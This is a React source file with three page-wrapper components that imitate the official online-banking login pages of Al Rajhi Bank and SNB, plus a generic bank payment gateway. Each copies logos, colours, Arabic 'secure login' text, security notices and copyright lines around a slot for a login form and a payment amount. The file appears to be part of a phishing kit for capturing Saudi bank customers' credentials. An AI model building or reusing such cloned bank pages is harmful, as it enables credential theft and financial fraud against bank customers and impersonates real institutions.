import React from 'react';
import { Lock, Shield, User, KeyRound, Smartphone, HelpCircle, ChevronRight, Menu, Bell } from 'lucide-react';
import { Bank } from '@/lib/banks';

interface BankCloneProps {
  children: React.ReactNode;
  bank: Bank;
  amount?: string;
}

export const AlRajhiOfficialClone: React.FC<BankCloneProps> = ({ children, bank, amount }) => {
  return (
    <div className="min-h-screen bg-[#F0F2F5] font-sans" dir="rtl">
      {/* Al Rajhi Official Header */}
      <header className="bg-[#0055A5] h-[72px] flex items-center justify-between px-6 shadow-lg sticky top-0 z-50">
        <div className="flex items-center gap-6">
          <img src={bank.logo} alt="Al Rajhi" className="h-10 brightness-0 invert" />
          <div className="h-8 w-px bg-white/20 hidden md:block" />
          <div className="hidden md:flex items-center gap-4 text-white/80 text-sm font-bold">
            <span>المصرفية الشخصية</span>
            <span>المصرفية للأعمال</span>
          </div>
        </div>
        <div className="flex items-center gap-3">
           <div className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center text-white">
             <Bell className="w-5 h-5" />
           </div>
           <div className="bg-[#004282] text-white px-6 py-2 rounded-lg text-sm font-bold flex items-center gap-2">
             <Lock className="w-4 h-4" />
             <span>دخول آمن</span>
           </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-12 max-w-4xl">
        <div className="grid lg:grid-cols-12 gap-10">
          <div className="lg:col-span-7">
            <div className="bg-white rounded-[24px] shadow-2xl overflow-hidden border border-gray-100">
              <div className="bg-gradient-to-r from-[#0055A5] to-[#003B75] p-10 text-white">
                <h1 className="text-3xl font-black mb-2">مرحباً بك في المباشر</h1>
                <p className="opacity-70 text-sm">قم بتسجيل الدخول لإتمام عملية الدفع الآمنة</p>
              </div>
              <div className="p-10">
                {children}
              </div>
            </div>
          </div>

          <div className="lg:col-span-5 space-y-6">
            <div className="bg-white rounded-3xl p-8 border shadow-sm">
              <h3 className="font-black text-lg text-[#0055A5] mb-4 flex items-center gap-2">
                <Shield className="w-5 h-5" />
                تنبيه أمني
              </h3>
              <p className="text-xs text-gray-500 leading-relaxed">
                مصرف الراجحي لن يطلب منك أبداً الإفصاح عن كلمة المرور أو رمز التفويض عبر الهاتف أو الرسائل النصية.
              </p>
            </div>
            
            <div className="bg-[#0055A5] rounded-3xl p-8 text-white relative overflow-hidden group">
              <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -mr-16 -mt-16 transition-transform group-hover:scale-110" />
              <h4 className="font-bold mb-2">تحتاج لمساعدة؟</h4>
              <p className="text-xs opacity-70 mb-6">فريقنا متاح لخدمتك على مدار الساعة</p>
              <button className="bg-white text-[#0055A5] w-full py-3 rounded-xl font-black text-sm">اتصل بنا: 920003344</button>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-white border-t py-10 px-6 mt-12">
        <div className="container mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
          <img src={bank.logo} className="h-6 opacity-30 grayscale" />
          <div className="flex gap-8 text-[10px] text-gray-400 font-bold uppercase tracking-widest">
            <a href="#">سياسة الخصوصية</a>
            <a href="#">الشروط والأحكام</a>
            <a href="#">الأمن</a>
          </div>
          <p className="text-[10px] text-gray-300">© 2025 مصرف الراجحي. جميع الحقوق محفوظة.</p>
        </div>
      </footer>
    </div>
  );
};

export const SNBOfficialClone: React.FC<BankCloneProps> = ({ children, bank }) => {
  return (
    <div className="min-h-screen bg-[#F4F7F6] font-sans" dir="rtl">
      <header className="bg-white h-[80px] border-b-4 border-[#006A4D] flex items-center justify-between px-10 shadow-sm sticky top-0 z-50">
        <img src={bank.logo} alt="SNB" className="h-12" />
        <div className="flex items-center gap-8">
          <nav className="hidden lg:flex items-center gap-8 text-[#006A4D] font-bold text-sm">
            <span>الأهلي أون لاين</span>
            <span>الأهلي موبايل</span>
            <span>سداد</span>
          </nav>
          <div className="w-10 h-10 rounded-full bg-[#006A4D]/10 flex items-center justify-center text-[#006A4D]">
            <User className="w-5 h-5" />
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-16 max-w-2xl">
        <div className="bg-white rounded-none shadow-2xl border-t-[6px] border-[#006A4D]">
          <div className="p-12">
            <div className="flex flex-col items-center mb-10">
              <div className="w-20 h-20 bg-[#006A4D]/5 rounded-full flex items-center justify-center mb-6">
                <Lock className="w-10 h-10 text-[#006A4D]" />
              </div>
              <h1 className="text-2xl font-black text-[#006A4D]">تسجيل الدخول الآمن</h1>
              <p className="text-gray-400 text-sm mt-2">أدخل بياناتك للوصول إلى حساباتك</p>
            </div>
            {children}
          </div>
          <div className="bg-gray-50 p-6 flex items-center justify-center gap-4 text-[10px] text-gray-400 font-bold uppercase tracking-tighter border-t">
            <Shield className="w-4 h-4" />
            <span>PROTECTED BY DIGIPASS TECHNOLOGY</span>
          </div>
        </div>
      </main>
    </div>
  );
};

export const GenericBankClone: React.FC<BankCloneProps> = ({ children, bank, amount }) => {
  return (
    <div className="min-h-screen bg-[#FAFAFA] font-sans" dir="rtl">
      <header className="bg-white border-b px-6 py-4 flex items-center justify-between sticky top-0 z-50 shadow-sm">
        <div className="flex items-center gap-4">
          <img src={bank.logo} alt={bank.nameAr} className="h-10" />
          <h2 className="text-lg font-bold" style={{ color: bank.color }}>{bank.nameAr}</h2>
        </div>
        <div className="flex items-center gap-2 text-xs font-bold text-gray-400 bg-gray-50 px-4 py-2 rounded-full border">
          <Lock className="w-3.5 h-3.5" />
          <span>تشفير 256 بت نشط</span>
        </div>
      </header>

      <main className="container mx-auto px-4 py-12 max-w-xl text-right">
        <div className="bg-white rounded-3xl shadow-xl overflow-hidden border">
          <div className="p-8 border-b bg-gray-50/50">
            <div className="flex items-center justify-between">
              <div>
                <h1 className="text-xl font-black mb-1">بوابة الدفع البنكي</h1>
                <p className="text-xs text-gray-400">يرجى تسجيل الدخول للمتابعة</p>
              </div>
              {amount && (
                <div className="text-center">
                   <p className="text-[10px] text-gray-400 font-bold uppercase mb-1">المبلغ</p>
                   <p className="text-lg font-black" style={{ color: bank.color }}>{amount}</p>
                </div>
              )}
            </div>
          </div>
          <div className="p-8">
            {children}
          </div>
        </div>
      </main>
    </div>
  );
};
